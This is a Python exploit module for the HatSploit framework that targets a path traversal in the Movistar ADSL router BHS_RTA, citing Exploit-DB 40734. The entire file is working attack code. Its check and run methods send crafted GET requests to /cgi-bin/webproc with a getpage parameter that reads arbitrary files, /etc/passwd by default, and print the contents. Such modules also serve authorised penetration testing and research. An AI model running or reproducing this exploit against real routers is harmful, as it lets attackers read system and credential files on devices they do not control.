"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Movistar ADSL Router BHS_RTA Path Traversal",
            'Module': "exploit/linux/movistar/adsl_path_traversal",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Todor Donev - vulnerability researcher",
            ],
            'Description': """
                Movistar ADSL Router BHS_RTA has a vulnerability exploitation
                of which leads to a path traversal.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/40734'},
                {'EDB': 40734}
            ],
            'DisclosureDate': "2016-11-08",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.file = Option('FILE', "/etc/passwd", "File to read.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path=f'/cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page=',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path=f'/cgi-bin/webproc?getpage={self.file.value}&var:language=es_es&var:page=',
        )

        if response.text:
            self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")
